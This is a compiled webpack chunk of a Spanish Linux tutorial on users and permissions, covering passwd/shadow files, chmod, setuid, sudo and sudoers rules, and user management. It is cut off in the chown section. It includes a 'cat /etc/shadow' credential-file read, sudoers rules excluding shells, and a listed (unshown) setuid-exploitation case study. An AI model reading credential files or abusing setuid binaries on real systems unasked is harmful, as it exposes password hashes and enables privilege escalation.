"use strict";(self.webpackChunkrubenfgr_website=self.webpackChunkrubenfgr_website||[]).push([[8315],{2550:(e,r,s)=>{s.r(r),s.d(r,{assets:()=>d,contentTitle:()=>a,default:()=>t,frontMatter:()=>o,metadata:()=>c,toc:()=>l});var i=s(4848),n=s(8453);const o={sidebar_position:6},a="Usuarios y permisos",c={id:"systems/linux/users_permissions",title:"Usuarios y permisos",description:"passwd, shadow, group",source:"@site/docs/systems/linux/users_permissions.mdx",sourceDirName:"systems/linux",slug:"/systems/linux/users_permissions",permalink:"/docs/systems/linux/users_permissions",draft:!1,unlisted:!1,tags:[],version:"current",sidebarPosition:6,frontMatter:{sidebar_position:6},sidebar:"tutorialSidebar",previous:{title:"Redirecciones y pipelines",permalink:"/docs/systems/linux/io-redirection"},next:{title:"Procesos",permalink:"/docs/systems/linux/process"}},d={},l=[{value:"passwd, shadow, group",id:"passwd-shadow-group",level:2},{value:"/etc/passwd",id:"etcpasswd",level:3},{value:"/etc/shadow",id:"etcshadow",level:3},{value:"/etc/group",id:"etcgroup",level:3},{value:"Lectura (r), Escritura (w) y Ejecuci\xf3n (x)",id:"lectura-r-escritura-w-y-ejecuci\xf3n-x",level:2},{value:"Permisos de archivos",id:"permisos-de-archivos",level:3},{value:"Permisos de directorios",id:"permisos-de-directorios",level:3},{value:"Usuario ROOT",id:"usuario-root",level:2},{value:"Cambiar permisos en octal",id:"cambiar-permisos-en-octal",level:2},{value:"Cambiar permisos con s\xedmbolos",id:"cambiar-permisos-con-s\xedmbolos",level:2},{value:"Permisos por defecto: umask",id:"permisos-por-defecto-umask",level:2},{value:"Setuid, Setgid y Sticky Bit",id:"setuid-setgid-y-sticky-bit",level:2},{value:"Cambio de identidad: su",id:"cambio-de-identidad-su",level:2},{value:"Ejecutar comandos en nombre de otro usuario",id:"ejecutar-comandos-en-nombre-de-otro-usuario",level:3},{value:"sudo",id:"sudo",level:2},{value:"sudoers",id:"sudoers",level:2},{value:"Privilegios por defecto",id:"privilegios-por-defecto",level:3},{value:"Desglose de la configuraci\xf3n",id:"desglose-de-la-configuraci\xf3n",level:3},{value:"Ejemplos",id:"ejemplos",level:3},{value:"Gesti\xf3n de Usuarios y Grupos",id:"gesti\xf3n-de-usuarios-y-grupos",level:2},{value:"A\xf1adir un nuevo usuario",id:"a\xf1adir-un-nuevo-usuario",level:3},{value:"A\xf1adir un nuevo grupo",id:"a\xf1adir-un-nuevo-grupo",level:3},{value:"Mostrar grupos",id:"mostrar-grupos",level:3},{value:"A\xf1adir a un grupo",id:"a\xf1adir-a-un-grupo",level:3},{value:"Cambiar grupo primario",id:"cambiar-grupo-primario",level:3},{value:"Cambiar nombre",id:"cambiar-nombre",level:3},{value:"Cambiar home",id:"cambiar-home",level:3},{value:"Cambiar el id",id:"cambiar-el-id",level:3},{value:"Cambiar la contrase\xf1a",id:"cambiar-la-contrase\xf1a",level:3},{value:"Eliminar un grupo",id:"eliminar-un-grupo",level:3},{value:"Eliminar un usuario",id:"eliminar-un-usuario",level:3},{value:"Cambio de propietario y grupo",id:"cambio-de-propietario-y-grupo",level:2},{value:"chgrp",id:"chgrp",level:3},{value:"Caso pr\xe1ctico: Explotando el bit setuid",id:"caso-pr\xe1ctico-explotando-el-bit-setuid",level:2}];function u(e){const r={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,n.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(r.h1,{id:"usuarios-y-permisos",children:"Usuarios y permisos"}),"\n",(0,i.jsx)(r.h2,{id:"passwd-shadow-group",children:"passwd, shadow, group"}),"\n",(0,i.jsxs)(r.p,{children:["Los usuarios y grupos de un sistema Linux se gestionan a trav\xe9s de los archivos ",(0,i.jsx)(r.code,{children:"/etc/passwd"}),", ",(0,i.jsx)(r.code,{children:"/etc/shadow"})," y ",(0,i.jsx)(r.code,{children:"/etc/group"}),"."]}),"\n",(0,i.jsxs)(r.p,{children:["Con el comando ",(0,i.jsx)(r.strong,{children:"id"})," se puede obtener informaci\xf3n sobre el usuario actual:"]}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"UID: Identificador de usuario"}),"\n",(0,i.jsx)(r.li,{children:"GID: Identificador de grupo"}),"\n",(0,i.jsx)(r.li,{children:"Grupos: Grupos a los que pertenece el usuario"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"id\n"})}),"\n",(0,i.jsx)(r.h3,{id:"etcpasswd",children:"/etc/passwd"}),"\n",(0,i.jsxs)(r.p,{children:["El archivo ",(0,i.jsx)(r.code,{children:"/etc/passwd"})," contiene informaci\xf3n sobre los usuarios del sistema. Cada l\xednea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos ",(0,i.jsx)(r.code,{children:":"}),":"]}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"Nombre de usuario"}),"\n",(0,i.jsxs)(r.li,{children:["Contrase\xf1a (se utiliza ",(0,i.jsx)(r.code,{children:"x"})," para indicar que la contrase\xf1a est\xe1 en el archivo ",(0,i.jsx)(r.code,{children:"/etc/shadow"}),")"]}),"\n",(0,i.jsx)(r.li,{children:"UID (User ID)"}),"\n",(0,i.jsx)(r.li,{children:"GID (Group ID)"}),"\n",(0,i.jsx)(r.li,{children:"Nombre completo del usuario"}),"\n",(0,i.jsx)(r.li,{children:"Directorio de inicio"}),"\n",(0,i.jsx)(r.li,{children:"Int\xe9rprete de comandos"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"cat /etc/passwd\n"})}),"\n",(0,i.jsx)(r.h3,{id:"etcshadow",children:"/etc/shadow"}),"\n",(0,i.jsxs)(r.p,{children:["El archivo ",(0,i.jsx)(r.code,{children:"/etc/shadow"})," contiene informaci\xf3n sobre las contrase\xf1as de los usuarios del sistema. Cada l\xednea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos ",(0,i.jsx)(r.code,{children:":"}),":"]}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"Nombre de usuario"}),"\n",(0,i.jsx)(r.li,{children:"Contrase\xf1a cifrada"}),"\n",(0,i.jsx)(r.li,{children:"Fecha de \xfaltimo cambio de contrase\xf1a"}),"\n",(0,i.jsx)(r.li,{children:"D\xedas m\xednimos entre cambios de contrase\xf1a"}),"\n",(0,i.jsx)(r.li,{children:"D\xedas m\xe1ximos entre cambios de contrase\xf1a"}),"\n",(0,i.jsx)(r.li,{children:"D\xedas de advertencia antes de que la contrase\xf1a caduque"}),"\n",(0,i.jsx)(r.li,{children:"D\xedas de inactividad antes de que la cuenta se bloquee"}),"\n",(0,i.jsx)(r.li,{children:"Fecha de caducidad de la cuenta"}),"\n",(0,i.jsx)(r.li,{children:"Cuenta bloqueada"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"cat /etc/shadow\n"})}),"\n",(0,i.jsx)(r.h3,{id:"etcgroup",children:"/etc/group"}),"\n",(0,i.jsxs)(r.p,{children:["El archivo ",(0,i.jsx)(r.code,{children:"/etc/group"})," contiene informaci\xf3n sobre los grupos del sistema. Cada l\xednea del archivo representa un grupo y contiene los siguientes campos separados por dos puntos ",(0,i.jsx)(r.code,{children:":"}),":"]}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"Nombre de grupo"}),"\n",(0,i.jsxs)(r.li,{children:["Contrase\xf1a (se utiliza ",(0,i.jsx)(r.code,{children:"x"})," para indicar que la contrase\xf1a est\xe1 en el archivo ",(0,i.jsx)(r.code,{children:"/etc/gshadow"}),")"]}),"\n",(0,i.jsx)(r.li,{children:"GID (Group ID)"}),"\n",(0,i.jsx)(r.li,{children:"Lista de usuarios que pertenecen al grupo"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"cat /etc/group\n"})}),"\n",(0,i.jsx)(r.h2,{id:"lectura-r-escritura-w-y-ejecuci\xf3n-x",children:"Lectura (r), Escritura (w) y Ejecuci\xf3n (x)"}),"\n",(0,i.jsx)(r.p,{children:"Los permisos de un archivo o directorio se dividen en tres categor\xedas: propietario, grupo y otros. Cada categor\xeda tiene tres permisos: lectura (r), escritura (w) y ejecuci\xf3n (x)."}),"\n",(0,i.jsx)("u",{children:"Existen 3 grupos de permisos:"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Propietario"}),": Permisos del usuario propietario del archivo o directorio."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Grupo"}),": Permisos del grupo al que pertenece el archivo o directorio."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Otros"}),": Permisos para el resto de usuarios."]}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"permisos-de-archivos",children:"Permisos de archivos"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"-"}),": Sin permisos"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"r"}),": Lectura. Permite ver el contenido del archivo."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"w"}),": Escritura. Permite modificar el contenido del archivo."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"x"}),": Ejecuci\xf3n. Permite ejecutar el archivo si es un script o programa."]}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"permisos-de-directorios",children:"Permisos de directorios"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"-"}),": Sin permisos"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"r"}),": Lectura. Permite ver el contenido del directorio."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"w"}),": Escritura. Permite modificar el contenido del directorio (crear, borrar archivos)."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"x"}),": Ejecuci\xf3n. Permite acceder al contenido del directorio."]}),"\n"]}),"\n",(0,i.jsx)(r.admonition,{type:"note",children:(0,i.jsx)(r.p,{children:"Tener permiso de lectura o escritura en un directorio sin permiso de ejecuci\xf3n no es \xfatil. Tener permiso de ejecuci\xf3n pero no de lectura es ocasionalmente \xfatil: permite acceder a los archivos s\xf3lo si se conoce su nombre exacto, un mecanismo muy rudimentario de protecci\xf3n."})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Permisos de un archivo\r\nls -l archivo\n"})}),"\n",(0,i.jsx)(r.h2,{id:"usuario-root",children:"Usuario ROOT"}),"\n",(0,i.jsxs)(r.p,{children:["El usuario ",(0,i.jsx)(r.strong,{children:"root"})," es el superusuario del sistema Linux y tiene todos los permisos. Se identifica con el UID 0 y puede realizar cualquier operaci\xf3n en el sistema."]}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar al usuario root se utiliza el comando ",(0,i.jsx)(r.strong,{children:"su"})," (substitute user) o ",(0,i.jsx)(r.strong,{children:"sudo"})," (superuser do)."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar al usuario root\r\nsu\r\n# Cambiar al usuario root con sudo\r\nsudo su\n"})}),"\n",(0,i.jsx)(r.admonition,{type:"warning",children:(0,i.jsx)(r.p,{children:"El usuario root tiene acceso total al sistema y puede realizar cambios que afecten al funcionamiento del sistema. Se recomienda utilizar el usuario root con precauci\xf3n.\r\nUn administrador de sistemas debe utilizar el usuario root s\xf3lo cuando sea necesario y preferiblemente utilizar sudo para ejecutar comandos con privilegios de superusuario."})}),"\n",(0,i.jsx)(r.h2,{id:"cambiar-permisos-en-octal",children:"Cambiar permisos en octal"}),"\n",(0,i.jsxs)(r.p,{children:["Los permisos de un archivo o directorio se pueden cambiar utilizando el comando ",(0,i.jsx)(r.strong,{children:"chmod"})," (change mode) seguido de un n\xfamero octal que representa los permisos."]}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"4"}),": Lectura (r)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"2"}),": Escritura (w)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"1"}),": Ejecuci\xf3n (x)"]}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:"La suma de los n\xfameros representa los permisos de la siguiente forma:"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"0"}),": Sin permisos"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"1"}),": Ejecuci\xf3n"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"2"}),": Escritura"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"3"}),": Escritura y ejecuci\xf3n"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"4"}),": Lectura"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"5"}),": Lectura y ejecuci\xf3n"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"6"}),": Lectura y escritura"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"7"}),": Lectura, escritura y ejecuci\xf3n"]}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar permisos de un archivo a 644\r\nchmod 644 archivo\r\n# Cambiar permisos de un directorio a 755\r\nchmod 755 directorio\n"})}),"\n",(0,i.jsx)(r.h2,{id:"cambiar-permisos-con-s\xedmbolos",children:"Cambiar permisos con s\xedmbolos"}),"\n",(0,i.jsxs)(r.p,{children:["Los permisos de un archivo o directorio se pueden cambiar utilizando el comando ",(0,i.jsx)(r.strong,{children:"chmod"})," seguido de los s\xedmbolos ",(0,i.jsx)(r.code,{children:"+"})," (a\xf1adir) o ",(0,i.jsx)(r.code,{children:"-"})," (quitar) y los permisos a modificar."]}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"u"}),": Propietario"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"g"}),": Grupo"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"o"}),": Otros"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"a"}),": Todos"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"r"}),": Lectura"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"w"}),": Escritura"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:["\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.strong,{children:"x"}),": Ejecuci\xf3n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# A\xf1adir permiso de escritura al grupo\r\nchmod g+w archivo\r\n# Quitar permiso de ejecuci\xf3n a otros\r\nchmod o-x archivo\n"})}),"\n",(0,i.jsx)(r.h2,{id:"permisos-por-defecto-umask",children:"Permisos por defecto: umask"}),"\n",(0,i.jsxs)(r.p,{children:["El comando ",(0,i.jsx)(r.strong,{children:"umask"})," (user file creation mask) establece los permisos por defecto para los archivos y directorios creados por un usuario."]}),"\n",(0,i.jsx)(r.p,{children:"El valor de umask se resta a los permisos m\xe1ximos (777 para directorios y 666 para archivos) para obtener los permisos reales."}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Ver el valor de umask\r\numask\r\n# Establecer umask a 022\r\numask 022\n"})}),"\n",(0,i.jsx)(r.h2,{id:"setuid-setgid-y-sticky-bit",children:"Setuid, Setgid y Sticky Bit"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Setuid (s)"}),": Permite que un archivo se ejecute con los permisos del propietario."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Setgid (s)"}),": Permite que un archivo se ejecute con los permisos del grupo."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"Sticky Bit (t)"}),": Permite que s\xf3lo el propietario pueda borrar o mover archivos en un directorio."]}),"\n"]}),"\n",(0,i.jsxs)(r.p,{children:["En la notaci\xf3n octal, el setuid se representa con el bit ",(0,i.jsx)(r.strong,{children:"4"}),", el setgid con el bit ",(0,i.jsx)(r.strong,{children:"2"})," y el sticky bit con el bit ",(0,i.jsx)(r.strong,{children:"1"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Establecer setuid en un archivo\r\nchmod u+s archivo\r\n# Establecer setgid en un archivo\r\nchmod g+s archivo\r\n# Establecer sticky bit en un directorio\r\nchmod +t directorio\n"})}),"\n",(0,i.jsx)(r.h2,{id:"cambio-de-identidad-su",children:"Cambio de identidad: su"}),"\n",(0,i.jsxs)(r.p,{children:["El comando ",(0,i.jsx)(r.strong,{children:"su"})," (substitute user) permite cambiar de usuario en un terminal. Si se ejecuta sin argumentos, cambia al usuario root."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Crear un nuevo usuario\r\nsudo adduser usuario\r\n# Cambiar al usuario root\r\nsu\r\n# Cambiar a otro usuario\r\nsu usuario\r\n# Cambiar a otro usuario moviendo el directorio de trabajo\r\nsu - usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"ejecutar-comandos-en-nombre-de-otro-usuario",children:"Ejecutar comandos en nombre de otro usuario"}),"\n",(0,i.jsxs)(r.p,{children:["Para ejecutar un comando en nombre de otro usuario se puede utilizar el comando ",(0,i.jsx)(r.strong,{children:"su"})," o ",(0,i.jsx)(r.strong,{children:"sudo"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:'# Ejecutar un comando en nombre de otro usuario\r\nsu -c "comando" usuario\r\n# Ejecutar un comando en nombre de otro usuario con sudo\r\nsudo -u usuario comando\n'})}),"\n",(0,i.jsx)(r.h2,{id:"sudo",children:"sudo"}),"\n",(0,i.jsxs)(r.p,{children:["El comando ",(0,i.jsx)(r.strong,{children:"sudo"})," (superuser do) permite ejecutar comandos con privilegios de superusuario. Para utilizar sudo es necesario a\xf1adir el usuario al grupo sudo."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# A\xf1adir un usuario al grupo sudo\r\nsudo usermod -aG sudo usuario\r\n# Ejecutar un comando con sudo\r\nsudo comando\r\n# Shell interactiva con sudo\r\nsudo -i\n"})}),"\n",(0,i.jsx)(r.h2,{id:"sudoers",children:"sudoers"}),"\n",(0,i.jsxs)(r.p,{children:["El archivo ",(0,i.jsx)(r.code,{children:"/etc/sudoers"})," contiene la configuraci\xf3n de sudo y permite definir qu\xe9 usuarios pueden ejecutar comandos con sudo y qu\xe9 comandos pueden ejecutar."]}),"\n",(0,i.jsxs)(r.p,{children:["Para editar el archivo sudoers se utiliza el comando ",(0,i.jsx)(r.strong,{children:"visudo"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Editar el archivo sudoers\r\nsudo visudo\n"})}),"\n",(0,i.jsx)(r.h3,{id:"privilegios-por-defecto",children:"Privilegios por defecto"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["root ALL=(ALL",":ALL",") ALL: Permite a root ejecutar cualquier comando en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:["%admin ALL=(ALL",":ALL",") ALL: Permite a los miembros del grupo admin ejecutar cualquier comando en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:["%sudo ALL=(ALL",":ALL",") ALL: Permite a los miembros del grupo sudo ejecutar cualquier comando en cualquier host."]}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"desglose-de-la-configuraci\xf3n",children:"Desglose de la configuraci\xf3n"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"root"}),": Usuario o grupo al que se aplican los privilegios."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"ALL"}),": Host al que se aplican los privilegios. Puede ser un nombre de host o ALL para todos los hosts."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsxs)(r.strong,{children:["(ALL",":ALL",")"]}),": Usuario y grupo al que se cambia al ejecutar el comando."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.strong,{children:"ALL"}),": Comando que se puede ejecutar."]}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"ejemplos",children:"Ejemplos"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL:ALL) ALL"}),": Permite a un usuario ejecutar cualquier comando en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%grupo ALL=(ALL:ALL) ALL"}),": Permite a los miembros de un grupo ejecutar cualquier comando en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) /bin/ls"}),": Permite a un usuario ejecutar el comando ",(0,i.jsx)(r.code,{children:"/bin/ls"})," en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) NOPASSWD: /bin/ls"}),": Permite a un usuario ejecutar el comando ",(0,i.jsx)(r.code,{children:"/bin/ls"})," en cualquier host sin contrase\xf1a."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) /bin/ls, /bin/cat"}),": Permite a un usuario ejecutar los comandos ",(0,i.jsx)(r.code,{children:"/bin/ls"})," y ",(0,i.jsx)(r.code,{children:"/bin/cat"})," en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) /bin/*"}),": Permite a un usuario ejecutar todos los comandos en ",(0,i.jsx)(r.code,{children:"/bin"})," en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) /bin/*, !/bin/sh"}),": Permite a un usuario ejecutar todos los comandos en ",(0,i.jsx)(r.code,{children:"/bin"})," excepto ",(0,i.jsx)(r.code,{children:"/bin/sh"})," en cualquier host."]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"usuario ALL=(ALL) /bin/*, !/bin/sh, !/bin/su"}),": Permite a un usuario ejecutar todos los comandos en ",(0,i.jsx)(r.code,{children:"/bin"})," excepto ",(0,i.jsx)(r.code,{children:"/bin/sh"})," y ",(0,i.jsx)(r.code,{children:"/bin/su"})," en cualquier host."]}),"\n"]}),"\n",(0,i.jsx)(r.h2,{id:"gesti\xf3n-de-usuarios-y-grupos",children:"Gesti\xf3n de Usuarios y Grupos"}),"\n",(0,i.jsx)(r.h3,{id:"a\xf1adir-un-nuevo-usuario",children:"A\xf1adir un nuevo usuario"}),"\n",(0,i.jsxs)(r.p,{children:["Para a\xf1adir un nuevo usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"adduser"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# A\xf1adir un nuevo usuario\r\nsudo adduser usuario\r\n# Avanzado\r\nsudo adduser --home /home/usuario --shell /bin/bash usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"a\xf1adir-un-nuevo-grupo",children:"A\xf1adir un nuevo grupo"}),"\n",(0,i.jsxs)(r.p,{children:["Para a\xf1adir un nuevo grupo se utiliza el comando ",(0,i.jsx)(r.strong,{children:"groupadd"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# A\xf1adir un nuevo grupo\r\nsudo addgroup grupo\r\n# Avanzado\r\nsudo groupadd --gid 1000 grupo\n"})}),"\n",(0,i.jsx)(r.h3,{id:"mostrar-grupos",children:"Mostrar grupos"}),"\n",(0,i.jsxs)(r.p,{children:["Para mostrar los grupos a los que pertenece un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"groups"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Mostrar los grupos de un usuario\r\ngroups usuario\r\nid usuario\r\n# Mostrar todos los grupos del sistema\r\ncat /etc/group\n"})}),"\n",(0,i.jsx)(r.h3,{id:"a\xf1adir-a-un-grupo",children:"A\xf1adir a un grupo"}),"\n",(0,i.jsxs)(r.p,{children:["Para a\xf1adir un usuario a un grupo se utiliza el comando ",(0,i.jsx)(r.strong,{children:"usermod"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# A\xf1adir un usuario a un grupo\r\nsudo usermod -aG grupo usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"cambiar-grupo-primario",children:"Cambiar grupo primario"}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar el grupo primario de un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"usermod"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el grupo primario de un usuario\r\nsudo usermod -g grupo usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"cambiar-nombre",children:"Cambiar nombre"}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar el nombre de un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"usermod"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el nombre de un usuario\r\nsudo usermod -l nuevo_usuario usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"cambiar-home",children:"Cambiar home"}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar el directorio de inicio de un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"usermod"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el directorio de inicio de un usuario\r\nsudo usermod -d /nuevo/home usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"cambiar-el-id",children:"Cambiar el id"}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar el identificador de un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"usermod"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el identificador de un usuario\r\nsudo usermod -u 1000 usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"cambiar-la-contrase\xf1a",children:"Cambiar la contrase\xf1a"}),"\n",(0,i.jsxs)(r.p,{children:["Para cambiar la contrase\xf1a de un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"passwd"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar la contrase\xf1a de un usuario\r\nsudo passwd usuario\n"})}),"\n",(0,i.jsx)(r.h3,{id:"eliminar-un-grupo",children:"Eliminar un grupo"}),"\n",(0,i.jsxs)(r.p,{children:["Para eliminar un grupo se utiliza el comando ",(0,i.jsx)(r.strong,{children:"groupdel"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Eliminar un grupo\r\nsudo groupdel grupo\n"})}),"\n",(0,i.jsx)(r.h3,{id:"eliminar-un-usuario",children:"Eliminar un usuario"}),"\n",(0,i.jsxs)(r.p,{children:["Para eliminar un usuario se utiliza el comando ",(0,i.jsx)(r.strong,{children:"userdel"}),"."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Eliminar un usuario\r\nsudo userdel usuario\n"})}),"\n",(0,i.jsx)(r.h2,{id:"cambio-de-propietario-y-grupo",children:"Cambio de propietario y grupo"}),"\n",(0,i.jsxs)(r.p,{children:["El comando ",(0,i.jsx)(r.strong,{children:"chown"})," (change owner) permite cambiar el propietario y el grupo de un archivo o directorio."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"# Cambiar el propietario de un archivo\r\nsudo chown usuario archivo\r\n# Cambiar el grupo de un archivo\r\nsudo chown :grupo 